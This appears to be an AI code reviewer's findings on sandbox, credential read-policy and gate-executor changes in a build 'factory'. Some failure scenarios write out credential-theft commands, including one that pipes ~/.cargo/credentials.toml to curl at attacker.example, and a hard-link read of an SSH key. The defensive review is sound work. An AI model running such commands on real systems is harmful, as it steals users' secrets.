findings.suggestion: Use an additive ALTER TABLE ... ADD COLUMN kind (default 'review') and key conflict rounds in a separate table, or document this as a deliberate exception with the rollback impact.
findings.failure_scenario: Deploy with an in-flight conflict round, then roll back. The old release's createReviewRound sees the conflict row as active and returns 409 'still in flight' for a review verdict, and counts it toward review_rounds.

findings.title: A trigger skipped because a round is in flight is never retried
findings.detail: startConflictTrigger marks the trigger 'skipped' with reason 'round in flight' (line 1131) and nothing re-enqueues it. The poller emits pr.conflicting only on a transition (github-poller diffPr), so while the PR stays CONFLICTING no new trigger arrives. If a review round is in flight when a land entry is blocked by a conflict, that conflict is never resolved automatically, even after the review round finishes. The request says a second trigger while one is in flight starts none, which does not say the trigger must be dropped.
findings.suggestion: Keep the trigger pending while the reason is 'round in flight' and retry it when the PR's rounds reach a terminal state, or re-record a trigger when the in-flight round is marked delivered or terminal.
findings.failure_scenario: Review round R1 is running. A land entry is blocked with 'conflicts with main', which records the trigger and marks it skipped. R1 succeeds. The land entry stays blocked and no conflict round ever starts for that head.

findings.title: Conflict comment can be posted twice when a transient error is retried
findings.detail: The conflict-round comment checks for its marker before posting (lines 1892-1894), but the post itself (line 1899) goes through the withGitHubRetry wrapper, which retries any transient error by replaying the same POST (repos.ts:71-96). If the first POST succeeds but its response is lost, the retry posts a second comment. The verification path in the same file (about lines 2008-2043) checks the marker inside the retried call, so this path is inconsistent with it.
findings.suggestion: Check the marker inside the retried call, or post the comment without retry and treat an uncertain outcome as a marker lookup.
findings.failure_scenario: GitHub accepts the comment POST but the response times out. withGitHubRetry retries; the marker check ran before the first attempt, so a second comment is posted.

findings.title: allowEmpty applies to every run whose conflictRound is set, not only review conflict rounds
findings.detail: allowEmpty is set to 'resolution', which is conflictRound === round (line 1081). conflictRound is also set for ordinary runs by mergeForDelivery on a delivery-time conflict (line 2247), so this change also removes the empty-diff block for ordinary runs. Before the change, an ordinary run whose resolution emptied its diff stopped at audit with needs_human. After it, the run proceeds to PR creation, which can fail with an opaque GitHub error. The test that motivated this is a review-round case.
findings.suggestion: Gate allowEmpty on the round being a review conflict round (review?.kind === 'conflict') rather than on the shared resolution flag.
findings.failure_scenario: An ordinary run hits a delivery-time conflict, and its resolution makes the change identical to the new base. Audit now allows the empty diff, and PR creation then fails with 'no commits between'.

findings.title: Ancestor path ends the conflict round with no record and no resolution
findings.detail: If the base tip is already an ancestor of the reviewed head, prepare sets phase done (line 547), so deliver is skipped. The review row keeps delivered_sha NULL, the land entry keeps 'conflicts with main', and no feed item is written. Because the head is not marked resolved, startConflictTrigger's 'head already resolved' check (store.ts:1132-1133) does not match, so a later trigger for the same head can start another round, subject only to the cap. A stale CONFLICTING observation can reach this path.
findings.suggestion: Record the no-op as delivered or skipped with a reason, and clear the land entry's conflict reason or mark it stale, so the record matches what happened.
findings.failure_scenario: GitHub reports CONFLICTING from a lagging mergeability check while the base is already in the PR. The round succeeds without pushing, the land entry still says 'conflicts with main', and a re-observed CONFLICTING starts another round for the same head.

findings.title: Auto-merge is disabled before the push is validated, with no log
findings.detail: deliverReviewRound runs 'gh pr merge --disable-auto' (line 1866) before remoteBranchSha and assertFactoryBranchPush. If the push is then refused (head moved, PR closed, fork), the auto-merge setting has already been changed, silently. The disable is conservative, but it is not in the request and it is not logged.
findings.suggestion: Move the disable after assertFactoryBranchPush and before the push, and log the change.
findings.failure_scenario: A human-enabled auto-merge is disabled, then the push is refused because the head moved. The PR silently loses its auto-merge setting.

findings.title: conflict_triggers grows without pruning, and the pending query is unindexed and runs for every tracked PR each poll
findings.detail: record() calls store.pendingConflictTriggers() for each tracked PR on every poll (line 373). The query filters on state with no index (migration conflict_triggers table has none), and started and skipped rows are never deleted. Each poll does a full scan of a table that grows with every CONFLICTING transition and every land block.
findings.suggestion: Add an index on (state, pr_url), or pull the pending triggers once per poll rather than once per PR, and prune terminal rows after a retention period.
findings.failure_scenario: Over months, with many PRs and transitions, each poll scans an ever-growing table once per tracked PR.

findings.title: Test gaps: the non-factory case skips the poller, and several new paths are untested
findings.detail: For 'non-factory' (line 365), the test bypasses the poller and calls startConflictTrigger directly with a fabricated observation, so the poller's trigger-time path for that case is not exercised. The eligibility tests always use a saved snapshot that matches the live PR, so the stale-snapshot defect above is not covered. Nothing tests the in-flight skip followed by a retry (the defect above), the ancestor path (line 449 covers only the no-push outcome, not the record), or a duplicate comment after a transient retry. The 'unknown' case (line 394) is not vacuous: I confirmed the poller makes one GraphQL call there.
findings.suggestion: Drive the non-factory case through startGitHubPoller, and add a test where the saved snapshot disagrees with the live PR for draft and head, plus one for the in-flight retry and one for the comment retry.
findings.failure_scenario: A regression that re-enables draft trigger starts or drops in-flight triggers would still pass the current suite.

findings.title: Comment reports 'Conflicted files: []' and 'Conflict resolved' even for a clean base merge
findings.detail: ctx.state.conflictFiles is only set on a real conflict, so a clean merge posts 'Conflicted files: []' and still says 'Conflict resolved at <sha>'. The text is accurate about the resolution but misleading about conflicts.
findings.suggestion: Omit the file list when conflictFiles is empty, and phrase the clean case as 'Merged base <sha>'.
findings.failure_scenario: A clean base merge posts a comment saying no files conflicted and a conflict was resolved.

output.summary: I ran the change in a copy of HEAD with dependencies installed, since the worktree has no node_modules. The 13 new executor tests pass. Across the related gate, baseline-cache, land-queue, config and pipeline suites there were 412 passes and 8 failures. Six failures are auditDiff tests that cannot read ~/.config/limitless/private-strings.txt under the sandbox, and the baseline-cache timeout also fails on the base commit, so both are environmental. The new "local check events" test is flaky (failed in 2 of 4 runs). The main defect is that resuming after a restart mid-retry reuses cached first attempts after the workspace has been cleaned, which produced a spurious blocking regression. I also confirmed that hooks are dropped for injected executors, and that the `[gates] executor` key is validated but never read. The diff is about 390 changed source lines against the ~200-line budget.

findings.title: Restart during a retry reuses the first attempt after its build output was cleaned, creating a spurious blocking regression
findings.detail: runGateExecution returns any purpose already in ctx.state.gateResults.values without re-running it. After a restart, oneRound first calls checkoutCommitted (engine.ts:1157), which runs `git clean -ffdxq` and removes untracked and ignored build output. It then reuses the cached 'initial' result and reattaches the pending 'regression-retry', which runs only the failing check. A check that depends on an earlier check's output (e.g. build then test) fails on retry. Reproduced with a probe in a temp copy (test/probe-restart.test.ts): build creates built.flag, test fails on its first post-change run and needs built.flag on retry. Uninterrupted: test=flaky, 1 implementer call. Killed at the regression-retry save and resumed: the log shows 'test retry: FAIL again', round 0 returns false, round 1 starts, and the run took 2 implementer calls. The base code re-runs the whole gates stage on resume, so build output is regenerated before the retry. The same mechanism could affect the prepare baseline-retry if the worktree is cleaned on resume; I did not verify that path.
findings.suggestion: Do not short-circuit completed purposes across a restart for retries that depend on the stage's earlier side effects. Either re-run the whole stage on resume as today, keeping only the pending handle, or keep the cache in-process only. Add a regression test with real gate commands in which a restart lands in a retry and the retry depends on a build output.
findings.failure_scenario: Gates: build (touch built.flag) then test (fails once, needs built.flag). Daemon restarts while regression-retry is pending. On resume, checkoutCommitted removes built.flag, the cached initial is reused, the retry runs test alone, fails, and the run starts an extra implementation round with feedback about a failure that does not exist in an uninterrupted run.

findings.title: New test 'local check events stream…' is flaky: it aborts while the next check is spawning
findings.detail: The test aborts the start signal in a finally block right after the first check event. If the second check has already begun spawning, the sandbox payload is killed before its start token, and runSandboxed throws 'Write confinement payload did not start: null' (sandbox.ts:211), so execution.result rejects. Observed: fails with that error on the first run in isolation, passes on the next, and fails in the full run. The same race exists in the base code path, but the new test asserts a clean partial result and so fails intermittently.
findings.suggestion: Make the abort deterministic: wait until the second check has started (for example, a sentinel file the sleep writes) before aborting, or accept either a partial result or a ConfinementError/AbortError when the abort lands mid-spawn.
findings.failure_scenario: Run `bun test test/gate-executor.test.ts` repeatedly: roughly half the runs fail with 'Write confinement payload did not start: null'.

findings.title: Hooks passed to executeGate are silently dropped when an executor is injected
findings.detail: executeGate only uses `hooks` to build a localExecutor when no executor is injected. With an injected executor (for example localExecutor() or a future LAN executor) onResult, onWait and holder are never called or applied. Confirmed in a probe: executeGate(..., {onResult: spy}, localExecutor()) calls spy 0 times. The Execution.events stream that would carry check events is never consumed in production. No production path injects an executor today, so there is no current user-visible change.
findings.suggestion: Route hooks into whatever executor runs the work, or have executeGate consume execution.events and forward them to hooks. Otherwise the seam cannot surface progress from a non-local executor.
findings.failure_scenario: A test or future deployment injects an executor and passes {onResult, holder:'land'} to executeGate. No check progress is recorded and the gate slot is labelled with the wrong holder.

findings.title: [gates] executor is validated but never selects anything
findings.detail: Config.gateExecutor is set to "local" (config.ts:340) and validated (config.ts:281), but nothing reads it. grep finds no consumer in src. Factory deps leave gateExecutor undefined, so local is hard-coded through executeGate's default. Requirement 4 asks for a selection key, so the key has no effect and a future executor would need new wiring.
findings.suggestion: Derive the executor from cfg.gateExecutor when constructing deps in app.ts, or document that the key is reserved and inert for now.
findings.failure_scenario: A user sets [gates] executor = "local". Behaviour is identical to omitting the key, and no code path consults the setting.

findings.title: Scope and budget overrun, with behaviour beyond the seam
findings.detail: Source changes total about 390 lines (executor 152, gate-execution 58, run 84, engine 58, queue 26, plus small edits) against a budget of about 200. Beyond the seam, the change adds cross-restart reuse of completed gate purposes (the cause of the major finding above), two new checkpoint saves on every gate execution (gate-started and gate-result), and an ExecutionEvent stream plus a 'status' variant that no production path consumes.
findings.suggestion: Cut the unconsumed events machinery and 'status' variant, and drop the restart reuse of completed purposes unless it is required. Each removal shrinks the diff toward the budget.
findings.failure_scenario: Reviewers must verify behaviour that the request said should not change, and extra saves add write load on every gate run.

findings.title: Persisted handle is passed through redactGateData, so replayed commands and paths may differ from what ran
findings.detail: gateExecution.handle is stored as redactGateData(handle). That replaces any registered credential substring in every string, including the replayed request's check commands, cwd and any future url. If a stored command contains such a substring, a resumed run executes the '[redacted]' form. Today's gate commands rarely contain registered secrets, so this is latent.
findings.suggestion: Persist the handle unredacted in the state (or keep replay fields such as request exact) and redact only at display boundaries, or store the request with a stable hash of the commands and verify on attach.
findings.failure_scenario: A check command contains a registered credential value of 8+ characters. After a restart the replayed check runs a different command.

findings.title: Generic ExecutionHandle carries a gate-specific field
findings.detail: ExecutionHandle sits in the generic Executor<Req,Res> interface but has `request?: GateRequest`, which couples it to gates and forces the Executor<unknown,unknown> cast on kind.
findings.suggestion: Make the handle generic with an opaque `payload` or move request into the gate-specific executor's own storage.
findings.failure_scenario: A non-gate executor inherits an unused gate-typed field.

output.summary: Reviewed the diff against efb67c4 by reading the read policy, scratch, sandbox, codex and claude code and the new tests. I ran sandbox and scratch tests from an exported copy in TMPDIR with a fake HOME: 103 pass, 13 skip, 2 fail. The 2 failures (a scratch-outside-TMPDIR test and a canary-root test) look caused by my sandbox TMPDIR and HOME override, but I did not confirm that against the base commit. The 13 skips are the real-Seatbelt probes, because nested sandbox-exec returns sandbox_apply: Operation not permitted here, so none of the real-probe claims could be checked. I did not run the codex or claude suites, or the gates suite. Verified by running the real functions on a temporary home fixture: gate profiles allow the whole Cargo home with no credential check, so ~/.cargo/credentials.toml is readable by gates. A factory data directory outside $HOME is not denied to gates. A dangling credential symlink makes every editor and gate refuse to start. Unverified because Seatbelt can't run here: whether a hard link from the writable checkout to a home credential file is readable under the profile. The change does not meet the "every credential store outside gate reads" requirement, so I recommend request_changes.

findings.title: Gate allowlist exposes Cargo credentials under ~/.cargo
findings.detail: homeReadPolicy adds the whole Cargo home (process.env.CARGO_HOME ?? join(home, '.cargo')) to allowRead for gates, after the profile denies file-read* on the home directory. The credential list (lines 88-102) and the overlap check cover only the listed stores, so ~/.cargo/credentials.toml, and ~/.cargo/config.toml (which can hold registry tokens), sit inside an allowed subtree and are readable by any gate command. Verified on a fixture home containing .cargo/credentials.toml: writeRoots(work, scratch, true).denyRead has no entry for it, the overlap check does not throw, and the profile contains (allow file-read* ... (subpath ".../home/.cargo")). docs/GUIDE.md and docs/ARCHITECTURE.md describe the Cargo home as readable without naming this file.
findings.suggestion: Do not allow the whole Cargo home. Allow only the subtrees gates need (for example bin and whatever registry or cache paths cargo reads), and add credentials and credentials.toml under the Cargo home to the credential list so they are denied and the overlap check covers them. Document the exception in GUIDE.md.
findings.failure_scenario: A candidate's gate command runs `cat ~/.cargo/credentials.toml` by absolute path (HOME is scratch, but the file is addressed directly) and sends the crates.io token over the open network.

findings.title: Factory data directory outside $HOME is not denied to gates
findings.detail: configureReadPolicy adds only configDir to the deny list. src/config.ts:315 passes raw.sandbox and configDir, but not paths.home. paths.home comes from LIMITLESS_HOME (src/config.ts:143), which can point anywhere. Gate profiles deny only homedir(). Verified: with the data directory outside the fixture home, the gate profile does not mention it. So api-token, worker/key.pem, runs/* (other runs' checkouts) and repos/* are readable by gates. The request requires the factory data directory to fall outside gate reads.
findings.suggestion: Pass paths.home into configureReadPolicy and add it to the gate deny list (and to the overlap check), alongside configDir. Add a test where LIMITLESS_HOME is outside the home directory.
findings.failure_scenario: The factory runs with LIMITLESS_HOME=/Volumes/data/limitless. A gate command reads /Volumes/data/limitless/api-token or another run's checkout under runs/ and sends the token out.

findings.title: Possible read of a home credential through a hard link inside the writable checkout
findings.detail: Seatbelt rules are path based. The checkout is granted file-read* and file-write*, and the profile has no file-link restriction. A hard link from ~/.ssh/key (or ~/.cargo/credentials.toml) into the checkout works at the OS level: I created one in a fixture with ln, and the link count rose to 2. If Seatbelt evaluates file-read against the name used for the open, rather than the inode's home path, a gate can read the credential through the checkout path. Not verified: nested sandbox-exec is unavailable here, so I could not run the profile. The real-probe tests do not include a hard-link case.
findings.suggestion: Add a real probe: hard-link a stand-in credential from the fixture home into the checkout, then read the link under the gate profile and expect denial. If reads succeed, consider a file-link deny on credential sources, or narrowing the checkout grant.
findings.failure_scenario: A gate command runs `ln ~/.ssh/id_ed25519 ./k && cat ./k`. The link is created under the writable checkout, and the read succeeds if Seatbelt matches the checkout name.

findings.title: A dangling symlink at a credential path makes every editor and gate refuse to start
findings.detail: policySpellings calls canonical() on each credential path (for example ~/.npmrc). If the path is a dangling symlink, realpathSync throws ENOENT, lstat finds the link, and the code throws ConfinementError. homeReadPolicy runs on every writeRoots call, so one broken dotfile link (for example from a stow setup) blocks all editors and gates. Verified: with home/.npmrc pointing to a missing target, writeRoots(work, scratch, false) throws 'Cannot resolve read policy path .../home/.npmrc'. Refusing is fail-closed, but the request asks for refusal only when home can't be resolved or an allowed path overlaps a credential.
findings.suggestion: For a dangling link, use the link's own path and its literal target text as the spellings to deny, instead of throwing. Refuse only for a home that can't be resolved or a real overlap.
findings.failure_scenario: A user's ~/.gnupg symlink points to a removed directory. Every editor and gate run fails with 'Cannot resolve read policy path', even though nothing in the run needs that path.

findings.title: Editor credential list omits factory and common credential stores
findings.detail: The editor list (lines 88-102) follows the request exactly: ssh, config/limitless, gh, codex, aws, netrc, npmrc, docker, gnupg, kube. It leaves out the factory API token and worker keys under ~/.limitless (api-token, worker/key.pem, worker-tls/key.pem, worker/token), which this session's sandbox config treats as credentials, along with ~/.cargo/credentials*, ~/.git-credentials and ~/.config/git/credentials. Claude and Codex editors can read them. The request's list was explicit, so this is a scope decision to make and report, not a code slip.
findings.suggestion: Either add the factory token and worker key paths and the common git and cargo credential files to the built-in list, or record them as known gaps alongside #369 and #484 in GUIDE.md.
findings.failure_scenario: A prompt-injected Claude editor runs `cat ~/.limitless/api-token` and reads the factory's loopback API token.

findings.title: Edit-mode read-probe failures are labelled as write-profile failures
findings.detail: In sandboxProbe, a read that is not denied returns editing ? WRITE_NOT_ENFORCED : NOT_ENFORCED. In edit mode this is a read failure, but the reason reads 'write profile not enforced'. The verdict is also cached as definitive (verdicts.set for WRITE_NOT_ENFORCED), so the wrong label persists for that CLI version and deny list.
findings.suggestion: Return a distinct read-not-enforced reason for edit-mode read probes, or reuse NOT_ENFORCED for both modes, and add a test that asserts the reason.
findings.failure_scenario: An operator sees 'write profile not enforced' for a codex editor whose credential read is allowed, and looks in the wrong place to fix it.

findings.title: SSH probe uses an explicit -i key and does not test default-key discovery
findings.detail: The SSH real-probe test passes -i <stand-in key> and a temporary root, so it never exercises the path the issue names: default key discovery through the password database. The test that reads the key with ssh-keygen -y also uses an explicit path. Nothing asserts that a default identity under the real home is denied.
findings.suggestion: Add a probe or unit assertion that a default identity under the resolved home is denied to a gate, or state in the test why the password-database path cannot be simulated here.
findings.failure_scenario: A future change that stops denying the home directory for identity lookups passes this test, because the test always supplies -i.

findings.title: Source change is well over the ~150-line budget
findings.detail: Source changes total about 270 lines: read-policy.ts 127 new lines (config schema validation, toolchain_paths, symlink-aware canonicalisation, redacting error class), codex.ts 56, sandbox.ts 39, scratch.ts 39. The request asked for about 150 lines. The extra toolchain_paths key and the canonicaliser are not required by the request.
findings.suggestion: Trim the non-required parts, or record the reason for the extra size in the PR description.
findings.failure_scenario: Not a runtime defect; the change is harder to review than the budget allows.

output.summary: Checked the diff against #487's four requirements by reading the code and running targeted probes. Installed dependencies in a copy under TMPDIR (the worktree was not modified). Ran sandbox, scratch, gates, harness and gate-feedback suites with HOME pointed at an empty stand-in: 295 tests, 278 pass, 15 skip (nested sandbox-exec is unavailable here, so every real-Seatbelt probe was skipped), and 2 fail because this sandbox denies writes to /private/tmp. Confirmed a credential-read bypass for gates: the cargo home is allowlisted wholesale, so ~/.cargo/credentials.toml stays readable. Confirmed a regression: the Codex editor probe returns INCONCLUSIVE whenever ~/.npmrc or ~/.netrc is a regular file, because canaryRoots returns it as a mkdtemp parent. Also confirmed that the factory data directory is only protected when it sits under $HOME, and that the editor probe writes canary directories into real credential directories. Not run: any real-Seatbelt probe, the ssh BatchMode check, and the Codex CLI probe against a real binary. Read-policy resolution, Seatbelt profile text and canary selection were checked from stand-in homes; tests that exercise the real canary selection were not run.

findings.title: Gate toolchain allowance re-grants ~/.cargo, leaving crates.io credentials readable
findings.detail: homeReadPolicy adds the cargo home (process.env.CARGO_HOME ?? ~/.cargo) to allowRead. The Seatbelt profile emits (allow file-read* (subpath ".../.cargo")) after the home-wide deny, and nothing later denies it. The credential list (lines 87-101) has no cargo entries, and the overlap check compares only against that list, so ~/.cargo/credentials.toml and ~/.cargo/credentials pass. runConfined also copies CARGO_HOME/config.toml into the scratch that gate code can read (src/harness/sandbox.ts:250), so a registry token in config.toml is exposed too. Verified with a stand-in home holding .cargo/credentials.toml: roots.allowRead contains <home>/.cargo, roots.denyRead does not contain credentials.toml, and in the generated profile the .cargo allow (offset 1815) comes after the home deny (offset 534) with no later deny rule.
findings.suggestion: Deny the cargo credential files explicitly after the toolchain allow (the same allow-then-specific-deny rule the DB already uses), and include config.toml in the copy filter. Better: allow only the toolchain subdirectories gates need (bin, lib, rustlib and similar), not the whole cargo home. Add the cargo credential paths to the overlap check so that a configured root covering one refuses to start. Add a real-Seatbelt probe for ~/.cargo/credentials.toml to the gate boundary test; the current test has none, which is why this slipped.
findings.failure_scenario: The owner has run `cargo login`, so ~/.cargo/credentials.toml holds a crates.io token. A candidate's gate command runs `cat ~/.cargo/credentials.toml | curl -d @- https://attacker.example`. Gates have network access, so the token leaves the machine. A malicious Dependabot install script can do the same.

findings.title: Codex editor probe is INCONCLUSIVE whenever a credential path such as ~/.npmrc is a regular file
findings.detail: For edit runs sandboxProbe builds negative canaries under every existing denied path: negatives = roots(deny...).map(root => canary(temp(root, 'limitless-canary-'))). canaryRoots (lines 331-352) returns each existing deny entry as its own canary parent when it is writable. A regular file such as ~/.npmrc or ~/.netrc is therefore used as a directory, mkdtempSync fails with ENOTDIR, the surrounding try (about line 578) returns INCONCLUSIVE, and runCodex reports 'Codex write confinement not verified ... probe inconclusive'. Reproduced by calling the real canaryRoots with a stand-in home containing a regular .npmrc: it returned <home>/.npmrc, and mkdtemp under it failed with ENOTDIR. Before this change, the editor probe's denied set contained only private roots, so this is a regression. The existing editor probe tests inject canaryRoots with fixed roots (test/scratch.test.ts around line 450), so none exercises the real selection. Running the same suites with a file-valued .npmrc in HOME still passed.
findings.suggestion: Use only directories as canary parents. For a file entry, make the write-denial check against its containing directory, or skip the write canary for file entries and rely on the read probe. Add a test that calls the real canaryRoots (or the probe without an injected canaryRoots) with a deny list containing a regular file, and asserts the probe still reaches a verdict.
findings.failure_scenario: On any developer machine where `npm login` has created ~/.npmrc (a regular file), every Codex edit run returns status 'unavailable' before the CLI starts. Operators see a write-confinement failure with no code change involved.

findings.title: Gate read policy denies only $HOME, so a factory data directory outside $HOME stays readable
findings.detail: The gate denyRead is [home, ...credentials, ...privateReadPaths()]. The factory data directory (paths.home, runs, work, repos) is never added. The only factory path passed in is configDir (src/harness/read-policy.ts:40). loadConfig honours LIMITLESS_HOME (src/config.ts:143). With LIMITLESS_HOME pointing outside the home directory, other runs' checkouts under .../runs/ and the factory's repos and work trees are readable by gate code. The request requires the factory data directory and other runs' checkouts to fall outside gate reads. Only the SQLite database is covered, through privateReadPaths.
findings.suggestion: Pass paths.home (and runs, work, repos) into the read-policy configuration alongside configDir. Deny them for gates using the same allow-after-deny rule as the home deny, so the run's own checkout and scratch stay readable. Add a test with the data directory outside the stand-in home.
findings.failure_scenario: The operator keeps factory data on an external volume and sets LIMITLESS_HOME=/Volumes/data/limitless. A candidate's test script reads /Volumes/data/limitless/runs/<other-run>/worktree/... and exfiltrates another run's unmerged code.

findings.title: Codex editor read leak is reported as a write-profile failure
findings.detail: probeReads returns editing ? WRITE_NOT_ENFORCED : NOT_ENFORCED when a credential read succeeds in an edit probe. The user-visible error becomes 'Codex write confinement not verified ... write profile not enforced' for what is a read leak, which sends diagnosis to the wrong profile.
findings.suggestion: Add a read-specific failure reason (for example 'read profile not enforced') and return it from probeReads in both modes.
findings.failure_scenario: The Codex editor profile fails to deny ~/.ssh reads. The operator sees a write-confinement failure and inspects the write roots, not the credential denies.

findings.title: Editor probe writes canary directories and token files inside real credential directories
findings.detail: Because canaryRoots returns credential directories (for example ~/.ssh, ~/.config/gh, ~/.gnupg) as canary parents, each Codex edit probe creates limitless-canary-* directories holding a random-token file inside them, then removes them. Reproduced: mkdtemp under a stand-in ~/.ssh succeeds. A crash or failed cleanup leaves files in ~/.ssh. Writes outside the write roots are already denied, so a write canary inside a credential store adds no protection.
findings.suggestion: Place canaries in a fresh temporary directory outside every credential store, or in the factory's own directory, and keep the credential paths as read-only denial targets.
findings.failure_scenario: The factory is killed during a Codex editor probe. limitless-canary-* directories with a token file remain in ~/.ssh and ~/.config/limitless.

findings.title: Credential files named by environment variables are not denied
findings.detail: The deny lists are fixed home-relative names. Credential files pointed to by environment variables (KUBECONFIG, AWS_SHARED_CREDENTIALS_FILE, NETRC, NPM_CONFIG_USERCONFIG, DOCKER_CONFIG, GNUPGHOME) pass through agentEnv unchanged. A gate can read them only when they sit outside $HOME, and an editor can read them whenever they use a name not on the list (for example NPM_CONFIG_USERCONFIG pointing to ~/.config/npm/token). The request's lists are explicit, so this is partly a scope question, but the item was not called out as a known gap.
findings.suggestion: Name this as a known gap in the docs next to the #369 note, or add the variables' resolved paths to the deny list.
findings.failure_scenario: KUBECONFIG=/opt/kube/config outside $HOME. A gate or Claude editor reads the kube token by absolute path, as the request's threat model describes.

findings.title: Gates can still read other invocations' scratch in the shared temporary directory
findings.detail: The gate deny covers only the home directory and credential stores. Other invocations' scratch under the shared temporary directory (/private/var/folders/...) stays readable, as privateReadRoots() already treats it for readers. The ARCHITECTURE.md residual-risk note was updated only for the implementer harness, so this gate-side exposure, which can include a holdout author's scratch file, is undocumented.
findings.suggestion: Either deny the sibling scratch roots for gates, or document the gap in ARCHITECTURE.md next to the holdout residual risk.
findings.failure_scenario: A holdout author writes scenario text to scratch. A gate of a parallel run reads that scratch file during the invocation and sees the holdout.

findings.title: Source delta is well above the stated budget
findings.detail: The request asks for about 150 changed source lines plus tests. The source diff is roughly 270 lines (read-policy.ts 127 new, codex.ts 56, sandbox.ts 39, scratch.ts 39, plus smaller edits). Most of the excess is the symlink-resolving policySpellings and the config validation.
findings.suggestion: Trim the resolver and validation where a simpler equivalent holds, or note the overrun in the PR description.
findings.failure_scenario: Review time grows and the new resolver is harder to audit against the budget the request set.

output.summary: Ran the targeted suites on a temp copy of HEAD (deps installed there; the worktree was not modified). gate-executor, gates, gate-feedback, config-routing, land-queue, pipeline-gates, baseline-cache, credentials, delivery/review restart, verification, gate-evidence, gate-slot, conflicts and drain: 243 tests, with 12 failures. Six auditDiff tests and six "loopback verification uses confined gate evidence" tests fail identically on the base commit (sandbox: private-strings file and confinement), so they are not findings. Typecheck passes; biome is clean on changed files. The main defect is that a graceful shutdown (Factory.stop, which aborts the run with reason "shutdown") clears the stored gate handle, so the resumed run calls start instead of attach; I reproduced this with a probe test. The second is that the change removes whole-state redaction on load and rewrites the legacy redaction test to assert the opposite. Also flagged: scope roughly 2x the 200-line budget with unrelated behaviour changes, a retry-purpose restart deviation from the spec, and a stuck-state edge case on handle-kind mismatch.

findings.title: Graceful shutdown clears the durable gate handle, so the resume starts a new execution instead of attaching
findings.detail: executeGate calls onSettled() in its finally even when the run signal was aborted (src/gates/executor.ts:195). runGateExecution then sets gateExecution=undefined and saves 'gate-result' (src/pipeline/gate-execution.ts:62-65) while the run is unwinding from Factory.stop()/scheduler shutdown. The run is re-queued with no stored handle. I confirmed this with a probe in a temp copy: a gate attached with kind 'lan' and blocked until cancel; after f.stop() the run status is 'queued' and gateExecution is undefined (it was {handle:{kind:'lan',id:'1'}} before stop).
